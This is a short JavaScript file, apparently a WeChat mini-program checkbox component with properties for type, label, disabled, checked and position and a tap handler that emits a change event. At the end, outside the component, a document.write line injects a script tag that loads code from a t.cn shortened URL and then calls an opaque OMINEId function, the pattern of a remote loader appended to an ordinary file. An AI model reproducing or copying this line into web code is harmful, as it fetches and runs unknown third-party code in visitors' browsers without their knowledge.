Component({
  externalClasses: ['custom-class'],
  options: {
    multipleSlots: true
  },
  properties: {
    type: {
      type: String,
      value: 'circle'
    },
    label: {
      type: String,
      value: '发生的吧'
    },
    disabled: {
      type: Boolean,
      value: false
    },
    checked: {
      type: Boolean,
      value: false
    },
    position: {
      type: String,
      value: 'left'
    }
  },

  methods: {
    onTap () {
      const { checked, disabled } = this.data
      if (disabled) {
        return
      }
      this.triggerEvent('change', !checked)
    }
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
